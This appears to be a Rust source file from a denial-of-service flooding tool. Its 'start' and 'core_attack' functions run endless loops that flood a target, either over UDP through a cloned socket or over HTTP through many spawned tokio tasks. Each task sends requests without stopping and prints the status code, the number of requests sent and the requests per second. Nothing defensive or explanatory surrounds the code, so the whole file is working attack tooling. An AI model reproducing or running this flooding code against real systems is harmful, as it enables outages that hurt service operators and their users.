use tokio::time::Instant;

use crate::functions::http::request;
use crate::functions::thread_mangers::{add_start, time_function};
use crate::functions::udp::udp;
use crate::ram_var::not_safe::UNSAFE_PUB_VAR;
use crate::ram_var::safe::SAFE_PUB_VAR;
use crate::where_attack::AttackData;

pub mod udp_version;

pub async fn start(data: AttackData) {
    if data.udp_mode {
        let val = &udp();
        loop {
            match val.try_clone() {
                Ok(pass_on) => udp_version::core_attack(pass_on),
                Err(e) => {
                    println!("failed starting socket: {}", e)
                }
            }
        }
    } else {
        loop {
            core_attack().await;
        }
    }
}

async fn core_attack() {
    if let Ok(threads) = SAFE_PUB_VAR.lock() {
        if threads.thread_on + 1.0 < threads.threads_allowed {
            add_start(threads);
            tokio::spawn(async {
                loop {
                    let (now, error_data) = (Instant::now(), request());
                    match error_data.await {
                        Ok(status_code) => unsafe {
                            UNSAFE_PUB_VAR.amount_sent += 1;
                            println!(
                                "Threads on {},\n Status code {},\n Request sent {}\n Time Elapsed {}\n Amount Sent In a Second {}",
                                UNSAFE_PUB_VAR.threads_on,
                                status_code.status(),
                                UNSAFE_PUB_VAR.amount_sent,
                                now.elapsed().as_secs(),
                                UNSAFE_PUB_VAR.time
                            );
                        }
                        Err(data) => unsafe {
                            println!(
                                "STATUS ERROR\n Threads on {},\n Status code {},\n Request sent {}\n Time Elapsed {}\n Amount Sent In a Second {}",
                                UNSAFE_PUB_VAR.threads_on,
                                data,
                                UNSAFE_PUB_VAR.amount_sent,
                                now.elapsed().as_secs(),
                                UNSAFE_PUB_VAR.time
                            );
                        }
                    }
                }
            });
        } else {
            time_function();
        }
    }
}

